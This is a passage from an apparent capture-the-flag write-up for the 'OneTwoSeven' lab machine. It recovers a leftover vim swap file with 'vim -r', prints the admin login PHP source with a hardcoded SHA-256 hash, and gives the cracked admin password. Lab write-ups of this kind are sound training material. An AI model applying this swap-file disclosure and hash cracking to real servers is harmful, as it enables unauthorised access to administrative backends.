--&gt;      &lt;title&gt;OneTwoSeven&lt;/title&gt;     &lt;meta name=&#34;generator&#34; content=&#34;Jekyll v3.8.5&#34;&gt;     &lt;meta name=&#34;author&#34; content=&#34;Mark Otto, Jacob Thornton, and Bootstrap contributors&#34;&gt;     &lt;meta name=&#34;description&#34; content=&#34;&#34;&gt;     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;&gt;     &lt;meta charset=&#34;utf-8&#34;&gt;   &lt;head&gt; &lt;html lang=&#34;en&#34;&gt; &lt;!doctype html&gt; &lt;?php session_start(); if (isset ($_SESSION[&#39;username&#39;])) { header(&#34;Location: /menu.php&#34;); } ?&gt;</span> <span style="color:#75715e">&lt;?php if ( $_SERVER[&#39;SERVER_PORT&#39;] != 60080 ) { die(); } ?&gt;</span> ad    �            �    �  �  }  p  e  d  @  ?      �
+</span></span><span style="display:flex;"><span>  �
+</span></span><span style="display:flex;"><span>  �
+</span></span><span style="display:flex;"><span>  �
+</span></span><span style="display:flex;"><span>  �
+</span></span><span style="display:flex;"><span>  �
+</span></span><span style="display:flex;"><span>  *
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  a  �  �  �                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        &lt;/<span style="color:#f92672">html</span>&gt;       &lt;<span style="color:#f92672">script</span>&gt;window.<span style="color:#a6e22e">jQuery</span> <span style="color:#f92672">||</span> document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#39;&lt;script src=&#34;/docs/4.3/assets/js/vendor/jquery-slim.min.js&#34;&gt;&lt;\/script&gt;&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dist/js/bootstrap.bundle.min.js&#34;</span> <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt; &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://code.jquery.com/jquery-3.3.1.slim.min.js&#34;</span> <span style="color:#a6e22e">integrity</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&#34;</span> <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt; &lt;/<span style="color:#f92672">main</span>&gt;   &lt;/<span style="color:#f92672">footer</span>&gt;     &lt;<span style="color:#f92672">p</span>&gt;&amp;copy; 2019 OneTwoSeven, Dec. &amp;middot; &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span>&gt;Privacy&lt;/<span style="color:#f92672">a</span>&gt; &amp;middot; &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span>&gt;Terms&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;     &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;float-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span>&gt;Back to top&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;   &lt;<span style="color:#f92672">footer</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;   <span style="color:#75715e">&lt;!-- FOOTER --&gt;</span>     &lt;/<span style="color:#f92672">div</span>&gt;<span style="color:#75715e">&lt;!-- /.container --&gt;</span>      <span style="color:#75715e">&lt;!-- /END THE FEATURETTES --&gt;</span>      &lt;<span style="color:#f92672">hr</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;featurette-divider&#34;</span>&gt;      &lt;/<span style="color:#f92672">div</span>&gt; 	     &lt;/<span style="color:#f92672">div</span>&gt;          &lt;/<span style="color:#f92672">form</span>&gt;             &lt;/<span style="color:#f92672">table</span>&gt;               &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span> <span style="color:#a6e22e">colspan</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span>&gt;&lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span>&gt;Login&lt;/<span style="color:#f92672">button</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;               &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;Password:&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;40&#34;</span> <span style="color:#a6e22e">required</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;               &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;Username:&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;40&#34;</span> <span style="color:#a6e22e">required</span> <span style="color:#a6e22e">autofocus</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt; ad  �
+</span></span><span style="display:flex;"><span>  5            �  �  �  W  G  9  -      �  �  �  B  5                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       	    &lt;<span style="color:#f92672">table</span>&gt;             &lt;<span style="color:#f92672">h4</span> <span style="color:#a6e22e">class </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;form-signin-heading&#34;</span>&gt;&lt;<span style="color:#f92672">font</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-1&#34;</span> <span style="color:#a6e22e">color</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;red&#34;</span>&gt;<span style="color:#75715e">&lt;?php echo $msg; ?&gt;</span>&lt;/<span style="color:#f92672">font</span>&gt;&lt;/<span style="color:#f92672">h4</span>&gt;          &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;              &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;container&#34;</span>&gt;              &lt;/<span style="color:#f92672">div</span>&gt; <span style="color:#75715e">&lt;!-- /container --&gt;</span>          ?&gt;             }               }                   $msg = &#39;Wrong username or password.&#39;;               } else { 		  header(&#34;Location: /menu.php&#34;);                   $_SESSION[&#39;username&#39;] = &#39;ots-admin&#39;; 
+</span></span></code></pre></div><p>From there, we can extract credentials for the admin backend:</p>
+<ul>
+<li><code>ots-admin</code>- <code>Homesweethome1</code>
+As the hash cracks to the password above using <a href="https://crackstation.net/">Crackstation</a></li>
+</ul>
+<h4 id="note">Note</h4>
+<p>It works this way but we can also recover the full content of the file by using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vim -r login.php.swp
+</span></span></code></pre></div><p>and we recover the entire content of the source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;?php if ( $_SERVER[&#39;SERVER_PORT&#39;] != 60080 ) { die(); } ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?php session_start(); if (isset ($_SESSION[&#39;username&#39;])) { header(&#34;Location: /menu.php&#34;); } ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mark Otto, Jacob Thornton, and Bootstrap contributors&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;generator&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Jekyll v3.8.5&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;OneTwoSeven&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Bootstrap core CSS --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/dist/css/bootstrap.min.css&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">bd-placeholder-img</span> { <span style="color:#66d9ef">font-size</span>: <span style="color:#ae81ff">1.125</span><span style="color:#66d9ef">rem</span>; text-anchor: <span style="color:#66d9ef">middle</span>; <span style="color:#66d9ef">-webkit-</span><span style="color:#66d9ef">user-select</span>: <span style="color:#66d9ef">none</span>; <span style="color:#66d9ef">-moz-</span><span style="color:#66d9ef">user-select</span>: <span style="color:#66d9ef">none</span>; <span style="color:#66d9ef">-ms-</span><span style="color:#66d9ef">user-select</span>: <span style="color:#66d9ef">none</span>; <span style="color:#66d9ef">user-select</span>: <span style="color:#66d9ef">none</span>; }
+</span></span><span style="display:flex;"><span>      @<span style="color:#66d9ef">media</span> <span style="color:#f92672">(</span><span style="color:#f92672">min-width</span><span style="color:#f92672">:</span> <span style="color:#f92672">768px</span><span style="color:#f92672">)</span> { .<span style="color:#a6e22e">bd-placeholder-img-lg</span> { <span style="color:#66d9ef">font-size</span>: <span style="color:#ae81ff">3.5</span><span style="color:#66d9ef">rem</span>; } }
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Custom styles for this template --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel.css&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">header</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">nav</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar navbar-expand-md navbar-dark fixed-top bg-dark&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-brand&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login.php&#34;</span>&gt;OneTwoSeven - Administration Backend&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-toggler&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">data-toggle</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse&#34;</span> <span style="color:#a6e22e">data-target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#navbarCollapse&#34;</span> <span style="color:#a6e22e">aria-controls</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbarCollapse&#34;</span> <span style="color:#a6e22e">aria-expanded</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">aria-label</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Toggle navigation&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-toggler-icon&#34;</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse navbar-collapse&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbarCollapse&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">nav</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">header</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">main</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;myCarousel&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel slide&#34;</span> <span style="color:#a6e22e">data-ride</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">ol</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel-indicators&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">li</span> <span style="color:#a6e22e">data-target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#myCarousel&#34;</span> <span style="color:#a6e22e">data-slide-to</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active&#34;</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">ol</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel-inner&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel-item active&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dist/img/ai-codes-coding-97077.jpg&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>          &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel-caption text-left&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">h1</span>&gt;OneTwoSeven Administration&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">p</span>&gt;Administration backend. For administrators only.&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>          &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel-control-prev&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#myCarousel&#34;</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">data-slide</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;prev&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel-control-prev-icon&#34;</span> <span style="color:#a6e22e">aria-hidden</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sr-only&#34;</span>&gt;Previous&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel-control-next&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#myCarousel&#34;</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">data-slide</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;next&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;carousel-control-next-icon&#34;</span> <span style="color:#a6e22e">aria-hidden</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sr-only&#34;</span>&gt;Next&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!-- Marketing messaging and featurettes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ================================================== --&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!-- Wrap the rest of the page in another container to center all the content. --&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container marketing&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- START THE FEATURETTES --&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;row featurette&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;col-md-12&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">h2</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;featurette-heading&#34;</span>&gt;Login to the kingdom.&lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-muted&#34;</span>&gt; Up up and away!&lt;/<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">h2</span>&gt;
+</span></span><span style="display:flex;"><span>          <span style="color:#75715e">&lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            $msg = &#39;&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	      if ($_POST[&#39;username&#39;] == &#39;ots-admin&#39; &amp;&amp; hash(&#39;sha256&#39;,$_POST[&#39;password&#39;]) == &#39;11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8&#39;) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                  $_SESSION[&#39;username&#39;] = &#39;ots-admin&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		  header(&#34;Location: /menu.php&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">              } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                  $msg = &#39;Wrong username or password.&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">              }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         ?&gt;</span>
+</span></span><span style="display:flex;"><span>      &lt;/<span style="color:#f92672">div</span>&gt; <span style="color:#75715e">&lt;!-- /container --&gt;</span>
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>         &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">h4</span> <span style="color:#a6e22e">class </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;form-signin-heading&#34;</span>&gt;&lt;<span style="color:#f92672">font</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-1&#34;</span> <span style="color:#a6e22e">color</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;red&#34;</span>&gt;<span style="color:#75715e">&lt;?php echo $msg; ?&gt;</span>&lt;/<span style="color:#f92672">font</span>&gt;&lt;/<span style="color:#f92672">h4</span>&gt;
+</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#f92672">table</span>&gt;
+</span></span><span style="display:flex;"><span>              &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;Username:&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;40&#34;</span> <span style="color:#a6e22e">required</span> <span style="color:#a6e22e">autofocus</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;
+</span></span><span style="display:flex;"><span>              &lt;<span style="color:#f92672">tr</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;Password:&lt;/<span style="color:#f92672">b</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">td</span>&gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;40&#34;</span> <span style="color:#a6e22e">required</span>&gt;&lt;/<span style="color:#f92672">td</span>&gt;&lt;/<span style="color:#f92672">tr</span>&gt;
